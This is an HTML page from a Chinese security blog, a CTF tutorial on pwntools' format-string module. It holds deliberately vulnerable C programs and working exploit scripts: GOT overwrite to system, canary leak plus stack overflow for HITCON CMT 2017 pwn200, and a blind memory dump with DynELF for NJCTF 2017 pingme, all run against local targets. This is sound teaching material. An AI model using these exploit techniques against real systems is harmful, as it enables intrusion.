@@ -1,0 +1,691 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+
+
+<head>
+  <meta charset="utf-8" />
+   
+  <meta name="keywords" content="博客，代码，安全，日常" />
+   
+  <meta name="description" content="记录学习与生活" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    Linux Pwn - pwntools fmtstr模块 |  lzeroyuee&#39;s blog
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="/images/my.png" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+  
+  
+
+  
+
+<link rel="alternate" href="/atom.xml" title="lzeroyuee's blog" type="application/atom+xml">
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    
+      
+      <canvas width="1777" height="841"
+        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-Linux-Pwn-pwntools-fmtstr模块"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  Linux Pwn - pwntools fmtstr模块
+</h1>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2021/02/28/Linux-Pwn-pwntools-fmtstr%E6%A8%A1%E5%9D%97/" class="article-date">
+  <time datetime="2021-02-28T11:25:27.000Z" itemprop="datePublished">2021-02-28</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">1.9k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">9 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>pwntools中的pwnlib.fmstr模块提供了字符串漏洞利用的工具。</p>
+<p>官方文档：<a target="_blank" rel="noopener" href="https://docs.pwntools.com/en/stable/fmtstr.html">pwnlib.fmtstr — Format string bug exploitation tools</a></p>
+<p>该模块中定义了<code>FmtStr</code>类和<code>fmtstr_payload</code>函数</p>
+<a id="more"></a>
+
+<p><code>FmtStr</code>提供了自动化的字符串漏洞利用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">classpwnlib.fmtstr.FmtStr(execute_fmt, offset=<span class="literal">None</span>, padlen=<span class="number">0</span>, numbwritten=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>execute_fmt</code>：与漏洞进程交互的函数</li>
+<li><code>offset</code>：控制的第一个格式化程序的偏移</li>
+<li><code>padlen</code>：在payload前添加的填充大小</li>
+<li><code>numbwritten</code>：已经写入的字节数</li>
+</ul>
+<p><code>fmtstr_payload</code>用于自动生成格式化字符串payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=<span class="number">0</span>, write_size=<span class="string">&#x27;byte&#x27;</span>) → <span class="built_in">str</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>offset</code>：控制的第一个格式化程序的偏移</li>
+<li><code>writes</code>：为字典，用于往addr中写入value，例如**{addr:** <strong>value,</strong> <strong>addr2:</strong> <strong>value2}</strong></li>
+<li><code>numbwritten</code>：已经由<code>printf</code>写入的字节数</li>
+<li><code>write_size</code>：必须是<code>byte/short/int</code>其中之一，指定按什么数据宽度写（<code>%hhn/%hn/%n</code>）</li>
+</ul>
+<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>编译如下程序<code>cc -m32 -fno-stack-protector -no-pie main.c -o main</code></p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">1024</span>);</span><br><span class="line">        read(<span class="built_in">stdin</span>, buf, <span class="number">1024</span>);</span><br><span class="line">        <span class="built_in">printf</span>(buf);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在此程序中，可以通过<code>printf</code>泄露并修改其地址为<code>system</code>，并在下次传入<code>/bin/sh</code>来获取shell</p>
+<p>首先调试查看输入的缓冲区在栈上的偏移，这里输入字符串”AAAA”，可以看到这里的<code>0x41414141</code>位于<code>printf</code>可变参列表的第四个，即偏移4</p>
+<p><img src="/2021/02/28/Linux-Pwn-pwntools-fmtstr%E6%A8%A1%E5%9D%97/1.png"></p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>首先需要先获取<code>printf</code>的got地址和libc中的偏移，以及<code>system</code>在libc中的偏移</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./main&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./main&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">printf_offset = libc.symbols[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">system_offset = libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">log,info(<span class="string">&quot;printf_got =&gt; %s&quot;</span> % <span class="built_in">hex</span>(printf_got))</span><br><span class="line">log,info(<span class="string">&quot;printf_offset =&gt; %s&quot;</span> % <span class="built_in">hex</span>(printf_offset))</span><br><span class="line">log,info(<span class="string">&quot;system_offset =&gt; %s&quot;</span> % <span class="built_in">hex</span>(system_offset))</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/02/28/Linux-Pwn-pwntools-fmtstr%E6%A8%A1%E5%9D%97/2.png"></p>
+<p>使用如下命令，也可得到相同的结果</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取printf_got</span></span><br><span class="line">pwn@ubuntu:~/workspace/format_vuln$ readelf -r main</span><br><span class="line">...</span><br><span class="line">0804a010  00000207 R_386_JUMP_SLOT   00000000   <span class="built_in">printf</span>@GLIBC_2.0</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取printf_offset</span></span><br><span class="line">pwn@ubuntu:~/workspace/format_vuln$ objdump -T /lib/i386-linux-gnu/libc.so.6 | grep <span class="built_in">printf</span></span><br><span class="line">...</span><br><span class="line">00049680 g    DF .text	0000002a  GLIBC_2.0   <span class="built_in">printf</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取system_offset</span></span><br><span class="line">pwn@ubuntu:~/workspace/format_vuln$ objdump -T /lib/i386-linux-gnu/libc.so.6 | grep system</span><br><span class="line">...</span><br><span class="line">0003adb0  w   DF .text	00000037  GLIBC_2.0   system</span><br></pre></td></tr></table></figure>
+<p>接着先试用一下<code>FmtStr</code>类来自动获取偏移，需要一个与进程交互函数<code>get_vuln_offset</code>，创建<code>FmtStr</code>对象并从返回值中获得偏移<code>vuln_offset</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_vuln_offset</span>(<span class="params">payload</span>):</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    info = p.recv()</span><br><span class="line">    <span class="keyword">return</span> info</span><br><span class="line"></span><br><span class="line">vuln_offset = FmtStr(get_vuln_offset).offset</span><br><span class="line">log,info(<span class="string">&quot;vuln_offset =&gt; %s&quot;</span> % <span class="built_in">hex</span>(vuln_offset))</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/02/28/Linux-Pwn-pwntools-fmtstr%E6%A8%A1%E5%9D%97/3.png"></p>
+<p>之后构造第一次泄露<code>printf</code>实际地址的payload，并发送给程序接收8个字节的输出，其中后4字节就是<code>printf</code>的实际地址</p>
+<p>利用<code>printf</code>在libc中的偏移计算<code>system</code>的实际地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = p32(printf_got) + <span class="string">&quot;%&#123;&#125;$.8s&quot;</span>.<span class="built_in">format</span>(vuln_offset)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">printf_addr = u32(p.recv()[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line">log,info(<span class="string">&quot;printf address =&gt; %s&quot;</span> % <span class="built_in">hex</span>(printf_addr))</span><br><span class="line"></span><br><span class="line">system_addr = printf_addr - printf_offset + system_offset</span><br><span class="line">log,info(<span class="string">&quot;system address =&gt; %s&quot;</span> % <span class="built_in">hex</span>(system_addr))</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/02/28/Linux-Pwn-pwntools-fmtstr%E6%A8%A1%E5%9D%97/4.png"></p>
+<p>最后，试着使用<code>fmtstr_payload</code>构造漏洞利用payload，获取shell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = fmtstr_payload(vuln_offset, &#123;printf_got : system_addr&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/02/28/Linux-Pwn-pwntools-fmtstr%E6%A8%A1%E5%9D%97/5.png"></p>
+<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="HITCON-CMT-2017-pwn200"><a href="#HITCON-CMT-2017-pwn200" class="headerlink" title="HITCON CMT 2017: pwn200"></a>HITCON CMT 2017: pwn200</h3><p>该题目有编码，编译开启Cannary和NX</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">canary_protect_me</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">40</span>];</span><br><span class="line">    gets(buf);</span><br><span class="line">    <span class="built_in">printf</span>(buf);	<span class="comment">// 格式化字符串漏洞</span></span><br><span class="line">    gets(buf);		<span class="comment">// 缓冲区溢出</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看出<code>printf</code>函数存在格式化字符串漏洞，而<code>gets</code>存在栈溢出，由于开启了Cannary，可以用<code>printf</code>泄露Cannary值然后通过栈溢出覆盖为相同的值，将返回地址替换为<code>canary_protect_me</code>地址</p>
+<p>首先获取Cannary值的位置，可以看到在<code>ebp-0xc</code>处，之后断在调用<code>printf</code>上，计算偏移</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> main:</span><br><span class="line">   0x08048564 &lt;+0&gt;:	lea    ecx,[esp+0x4]</span><br><span class="line">   0x08048568 &lt;+4&gt;:	and    esp,0xfffffff0</span><br><span class="line">   0x0804856b &lt;+7&gt;:	push   DWORD PTR [ecx-0x4]</span><br><span class="line">   0x0804856e &lt;+10&gt;:	push   ebp</span><br><span class="line">   0x0804856f &lt;+11&gt;:	mov    ebp,esp</span><br><span class="line">   0x08048571 &lt;+13&gt;:	push   ecx</span><br><span class="line">   0x08048572 &lt;+14&gt;:	sub    esp,0x34</span><br><span class="line">   0x08048575 &lt;+17&gt;:	mov    eax,gs:0x14</span><br><span class="line">   0x0804857b &lt;+23&gt;:	mov    DWORD PTR [ebp-0xc],eax	; Cannary</span><br><span class="line">   </span><br><span class="line"><span class="comment"># Canany地址   </span></span><br><span class="line">gdb-peda$ x/wx <span class="variable">$ebp</span>-0xc</span><br><span class="line">0xffffcf4c:	0xe7af4300</span><br><span class="line"><span class="comment"># 栈顶</span></span><br><span class="line">gdb-peda$ x/wx <span class="variable">$esp</span></span><br><span class="line">0xffffcf10:	0xffffcf24</span><br><span class="line"><span class="comment"># 偏移</span></span><br><span class="line">gdb-peda$ <span class="built_in">print</span> <span class="variable">$ebp</span>-0xc-<span class="variable">$esp</span></span><br><span class="line"><span class="variable">$7</span> = 0x3c</span><br><span class="line"><span class="comment"># 偏移，即15</span></span><br><span class="line">gdb-peda$ <span class="built_in">print</span> 0x3c/4</span><br><span class="line"><span class="variable">$8</span> = 0xf</span><br></pre></td></tr></table></figure>
+<p>拿到了Cannary的偏移，接着计算返回地址的位置，由于直到了Cannary的位置<code>ebp - 0xc</code>，返回地址在<code>ebp + 4</code>，所以可以变相求得返回地址相对于Cannary偏移<code>+0x10</code>，由于Cannary占4字节，填充完Cannary后偏移<code>+0xc</code>是返回地址，断在最后一个<code>gets</code>函数上，计算<code>buf</code>与Cannary的偏移为<code>0x28</code>，之后就可以构造exp了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./binary_200&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;%15$x&quot;</span>)</span><br><span class="line">cannary_value = <span class="built_in">int</span>(p.recv(), <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;Cannary Value =&gt; %s&quot;</span> % <span class="built_in">hex</span>(cannary_value))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">0x28</span> + p32(cannary_value) + <span class="string">&quot;B&quot;</span> * <span class="number">0xc</span> + p32(<span class="number">0x0804854D</span>)	<span class="comment"># 0x0804854D为canary_protect_me地址</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/02/28/Linux-Pwn-pwntools-fmtstr%E6%A8%A1%E5%9D%97/6.png"></p>
+<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>使用GCC编译时，可能会在生成的函数序言和尾声中额外添加一些代码，如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">; 序言</span><br><span class="line">lea     ecx, [esp+4]</span><br><span class="line">and     esp, 0FFFFFFF0h</span><br><span class="line">push    dword ptr [ecx-4]</span><br><span class="line">push    ebp</span><br><span class="line">mov     ebp, esp</span><br><span class="line"></span><br><span class="line">; 尾声</span><br><span class="line">mov     ecx, [ebp-4]</span><br><span class="line">leave</span><br><span class="line">lea     esp, [ecx-4]</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
+<p>根据<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/41140089/gcc-generated-assembly">相关资料</a>这段额外代码主要用于在堆栈上作16字节对齐，在x64下生成x86程序均会产生这种额外的代码，这种额外添加的代码会对缓冲区溢出覆盖<code>eip</code>造成一点点影响，但依然是可利用的。</p>
+<p><code>esp</code>是来自<code>ecx</code>，而<code>ecx</code>是<code>[ebp - 4]</code>，栈基址<code>ebp</code>在函数内一般是不会变动且位于高地址上，溢出是可以覆盖到此处，那么就可以实现控制<code>ecx</code>来简介控制<code>esp</code></p>
+<h3 id="NJCTF-2017-pingme"><a href="#NJCTF-2017-pingme" class="headerlink" title="NJCTF 2017: pingme"></a>NJCTF 2017: pingme</h3><p>此题只提供远程IP及端口，没有二进制文件，于是也就模拟同样在本地开启服务监听，不看二进制文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp-listen:8888,reuseaddr,fork <span class="built_in">exec</span>:./pingme &amp;</span><br></pre></td></tr></table></figure>
+<p>连接上去尝试输入一些东西，可以看到有格式化漏洞的痕迹</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwn@ubuntu:~/workspace/format_vuln$ nc 127.0.0.1 8888</span><br><span class="line">Ping me</span><br><span class="line">ABCD</span><br><span class="line">ABCD</span><br><span class="line">ABCD%x</span><br><span class="line">ABCD40</span><br></pre></td></tr></table></figure>
+<p>先确定一下此处的偏移，结果为7</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;8888&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_vuln_offset</span>(<span class="params">payload</span>):</span>   </span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    info = p.recv()</span><br><span class="line">    <span class="keyword">return</span> info</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Ping me\n&quot;</span>)</span><br><span class="line">vuln_offset = FmtStr(get_vuln_offset).offset</span><br><span class="line">log.info(<span class="string">&quot;vuln offset =&gt; %d&quot;</span> % vuln_offset)</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/02/28/Linux-Pwn-pwntools-fmtstr%E6%A8%A1%E5%9D%97/7.png"></p>
+<p>接着就可以利用格式化字符串漏洞来dump内存，由于此程序只开启了NX保护，x86下进程默认装载地址为<code>0x8048000</code>，dump一个分页大小也就足够了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump_process_memory</span>(<span class="params">start, mem_len</span>):</span></span><br><span class="line">    dump_len = <span class="number">0</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> dump_len &lt; mem_len:</span><br><span class="line">        p = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;8888&quot;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">&quot;Ping me\n&quot;</span>)</span><br><span class="line">        payload = <span class="string">&quot;%&#123;&#125;$s-ABC&quot;</span>.<span class="built_in">format</span>(vuln_offset + <span class="number">2</span>) + p32(start + dump_len)</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        data = p.recvuntil(<span class="string">&quot;-ABC&quot;</span>)[:-<span class="number">4</span>]</span><br><span class="line">        <span class="keyword">if</span> data == <span class="string">&quot;&quot;</span>:</span><br><span class="line">            data = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">        dump_len += <span class="built_in">len</span>(data)</span><br><span class="line">        result += data</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">dump_data = dump_process_memory(<span class="number">0x8048000</span>, <span class="number">0x1000</span>)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;dump&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">f.write(dump_data)</span><br><span class="line">f.close()</span><br><span class="line">log.info(<span class="string">&quot;dump over...&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>这样就拿到了部分二进制文件，目前还缺少libc，假设可以拿到libc，那么就要查看dump下来的文件，获取<code>printf</code>的got在于libc库比较，得到具体的libc，之后就是常规的计算偏移</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwn@ubuntu:~/workspace/format_vuln$ readelf -r dump | grep <span class="built_in">printf</span></span><br><span class="line">08049974  00000207 R_386_JUMP_SLOT   00000000   <span class="built_in">printf</span>@GLIBC_2.0</span><br></pre></td></tr></table></figure>
+<p>假设拿不到libc文件，那么就使用DynELF模块来泄露函数地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    p.recvline()</span><br><span class="line">    payload = <span class="string">&quot;%9$s-ABC&quot;</span> + p32(addr)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    data = p.recvuntil(<span class="string">&quot;-ABC&quot;</span>)[:-<span class="number">4</span>] + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">    log.info(<span class="string">&quot;leaking: 0x%x --&gt; %s&quot;</span> % (addr, data.encode(<span class="string">&#x27;hex&#x27;</span>)))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;8888&quot;</span>)</span><br><span class="line">dynelf = DynELF(leak, <span class="number">0x08048490</span>)	<span class="comment"># 0x08048490为dump下来文件中main函数地址</span></span><br><span class="line">system_addr = dynelf.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line">printf_addr = dynelf.lookup(<span class="string">&#x27;printf&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&quot;system addr =&gt; %s&quot;</span> % <span class="built_in">hex</span>(system_addr))</span><br><span class="line">log.info(<span class="string">&quot;printf addr =&gt; %s&quot;</span> % <span class="built_in">hex</span>(printf_addr))</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/02/28/Linux-Pwn-pwntools-fmtstr%E6%A8%A1%E5%9D%97/8.png"></p>
+<p>最后在在将<code>printf</code>的got地址替换为<code>system</code>的真实地址，传入<code>/bin/sh</code>即可获得shell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">print_got = <span class="number">0x08049974</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>, &#123;print_got : system_addr&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/02/28/Linux-Pwn-pwntools-fmtstr%E6%A8%A1%E5%9D%97/9.png"></p>
+ 
+      <!-- reward -->
+      
+      <div id="reword-out">
+        <div id="reward-btn">
+          打赏
+        </div>
+      </div>
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
